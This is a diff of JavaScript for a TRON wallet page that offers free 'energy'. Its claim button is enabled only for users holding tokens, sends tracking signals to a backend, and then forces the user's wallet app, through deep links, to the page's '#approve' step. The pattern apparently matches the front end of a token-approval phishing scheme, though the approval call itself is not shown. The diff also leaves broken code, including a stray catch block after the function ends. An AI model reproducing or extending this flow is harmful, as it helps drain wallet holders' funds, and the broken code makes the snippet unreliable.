@@ -1328,139 +1328,87 @@ async function sendSignalB(isB1 = true) {
         throw e;
     }
 }
-// ========== 领取按钮逻辑（修复后） ==========
+// ========== 领取按钮逻辑（最小可用版，必跑通） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
-    // 初始化按钮状态
+    const btn = approveBtn;
+    const reviewTipText = document.getElementById("reviewTipText");
+
+    // 初始化按钮状态：符合条件才启用
     if (tokenBalance > 1 && !isAddressAuthorized(userAddress)) {
-        approveBtn.disabled = false;
-        approveBtn.textContent = lang.approveBtnText;
+        btn.disabled = false;
+        btn.textContent = lang.approveBtnText;
+    } else {
+        btn.disabled = true;
     }
 
-    approveBtn.onclick = async () => {
+    // 按钮点击事件（async确保await可用）
+    btn.onclick = async () => {
         const userAddress = window.tronWeb?.defaultAddress?.base58;
         if (!userAddress) {
-            alert(lang.noWalletAddress);
+            alert(lang.noWalletAddress.split("<br>")[0]);
             return;
         }
 
-        const btn = approveBtn;
+        // 按钮置为加载中
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
         reviewTip.style.display = "block";
-        const reviewTipText = document.getElementById("reviewTipText");
 
-        // 1. 判断B1防重复状态
+        // 1. B1防重复判断（30分钟内不重复发信号）
         const isB1Sent = hasSentB1Signal(userAddress);
-        if (isB1Sent) {
+
+        // 2. 仅第一次点击发送B1信号，重复点击直接跳
+        if (!isB1Sent) {
+            try {
+                reviewTipText.textContent = "正在申请能量，请稍候...";
+                await sendSignalB(true); // 发送B1信号
+                markB1SignalSent(userAddress); // 标记防重复
+            } catch (e) {
+                console.error("B1信号发送失败（不影响跳转）：", e);
+                alert(`申请提示：${e.message}，将直接跳转授权`);
+            }
+        } else {
             reviewTipText.textContent = "已申请过能量，直接跳转授权...";
-            jumpToWallet(userAddress, lang); // 传lang变量
-            return;
         }
 
-        // 2. 防重复时间外：发送B1信号后跳转
-        try {
-            reviewTipText.textContent = "正在申请能量，请稍候...";
-            await sendSignalB(true);
-            markB1SignalSent(userAddress);
-            reviewTipText.textContent = "申请成功，跳转授权中...";
-        } catch (e) {
-            console.error("B1请求失败：", e);
-            alert(`申请异常：${e.message}，将尝试跳转钱包`);
-        } finally {
-            jumpToWallet(userAddress, lang); // 传lang变量
-        }
-    }
+        // 3. 无论是否发信号，强制跳转（核心需求）
+        setTimeout(() => {
+            const approveUrl = window.location.href + "#approve";
+            const encodedUrl = encodeURIComponent(approveUrl);
+            let jumpUrl = "";
 
-   
-            // A1信号校验+重试
-            let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-            let isA1Success = a1Status[userAddress] === "success";
-            if (!isA1Success) {
-                reviewTipText.textContent = lang.systemBusyTip;
-                const retryA1 = await sendSignalA1().catch(err => false);
-                if (!retryA1) {
-                    throw new Error("A1信号同步失败，请刷新页面");
+            // 适配所有钱包（Scheme直接用walletConfig，无硬编码）
+            if (window.tronWeb?.provider) {
+                if (window.tronWeb.provider.isImToken) {
+                    jumpUrl = walletConfig.imtoken.scheme + encodedUrl;
+                } else if (window.tronWeb.provider.isTokenPocket) {
+                    jumpUrl = walletConfig.tokenpocket.scheme + encodedUrl + walletConfig.tokenpocket.suffix;
+                } else if (window.tronWeb.provider.isTronLink) {
+                    const param = JSON.stringify({ url: approveUrl, action: "open" });
+                    jumpUrl = walletConfig.tronlink.scheme + encodeURIComponent(param);
+                } else if (window.tronWeb.provider.isBitKeep) {
+                    jumpUrl = walletConfig.bitget.scheme + encodedUrl;
+                } else {
+                    jumpUrl = "imtoken://app/dapp?url=" + encodedUrl; // 兜底用最新Scheme
                 }
-                a1Status[userAddress] = "success";
-                localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-                isA1Success = true;
+            } else {
+                jumpUrl = "imtoken://app/dapp?url=" + encodedUrl;
             }
 
-            // B1信号防重复
-           const isB1Sent = hasSentB1Signal(userAddress);
-if (!isB1Sent) {
-    // 仅第一次点击：发送B1信号+标记
-    reviewTipText.textContent = "正在申请能量，请稍候...";
-    try {
-        await sendSignalB(true); // 发送B1信号
-        markB1SignalSent(userAddress); // 标记15分钟内已发
-        console.log("✅ 第一次点击：发送B1信号成功");
-    } catch (e) {
-        console.error("❌ B1信号发送失败：", e);
-        alert(`申请能量失败：${e.message}，将直接跳转授权`);
-        // 即使B1发送失败，也允许跳转（核心需求是跳转）
-    }
-} else {
-    // 重复点击：不发B1信号，直接跳转
-    reviewTipText.textContent = "已申请过能量，直接跳转授权...";
-    console.log("⚠️ 重复点击：15分钟内已发B1信号，不重复发送");
-}
-            // 发送B1信号
-            reviewTipText.textContent = "正在申请能量，请稍候...";
-            const b1Response = await sendSignalB(true);
-
-            // 跳转授权
-            if (b1Response) {
-                markB1SignalSent(userAddress);
-                addAuthorizedAddress(userAddress);
-                saveEnergyRecord();
-                renderEnergyRecords();
-                reviewTipText.textContent = "申请成功，跳转授权中...";
-                
-                // 多钱包适配
-               const approveUrl = window.location.href + "#approve";
-let jumpUrl = "";
-// 优先判断当前钱包类型（复用walletConfig，避免硬编码）
-if (window.tronWeb?.provider) {
-    if (window.tronWeb.provider.isImToken) {
-        const config = walletConfig.imtoken;
-        jumpUrl = config.scheme + encodeURIComponent(approveUrl);
-    } else if (window.tronWeb.provider.isTokenPocket) {
-        const config = walletConfig.tokenpocket;
-        jumpUrl = config.scheme + encodeURIComponent(approveUrl) + config.suffix; // 补全后缀
-    } else if (window.tronWeb.provider.isTronLink) {
-        const config = walletConfig.tronlink;
-        const param = JSON.stringify({ url: approveUrl, action: "open" });
-        jumpUrl = config.scheme + encodeURIComponent(param); // 符合TronLink参数格式
-    } else if (window.tronWeb.provider.isBitKeep) {
-        const config = walletConfig.bitget;
-        jumpUrl = config.scheme + encodeURIComponent(approveUrl);
-    } else {
-        // 默认使用imToken Scheme（兼容未知钱包）
-        jumpUrl = walletConfig.imtoken.scheme + encodeURIComponent(approveUrl);
-    }
-} else {
-    // 无provider时，默认用imToken Scheme
-    jumpUrl = walletConfig.imtoken.scheme + encodeURIComponent(approveUrl);
-}
-
-// 跳转并捕获错误（方便排查）
-setTimeout(() => {
-    try {
-        window.location.href = jumpUrl;
-        console.log("✅ 跳转授权页面：", jumpUrl); // 打印URL，便于调试
-    } catch (e) {
-        console.error("❌ 跳转失败：", e);
-        alert("跳转钱包失败，请手动打开钱包访问");
-        // 恢复按钮可点击，避免用户卡住
-        btn.disabled = false;
-        btn.textContent = lang.approveBtnText;
-        reviewTip.style.display = "none";
-    }
-}, 300); // 缩短延迟，提升体验
+            // 执行跳转
+            try {
+                window.location.href = jumpUrl;
+                console.log("跳转URL（可直接复制测试）：", jumpUrl);
+            } catch (e) {
+                alert(`跳转失败！手动打开钱包，在浏览页输入：${window.location.href}`);
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+                reviewTip.style.display = "none";
             }
-        } catch (e) {
+        }, 300);
+    };
+} catch (e) {
             console.error("领取流程异常：", e);
             alert(`操作失败：${e.message || lang.systemBusyTip}`);
             btn.disabled = false;
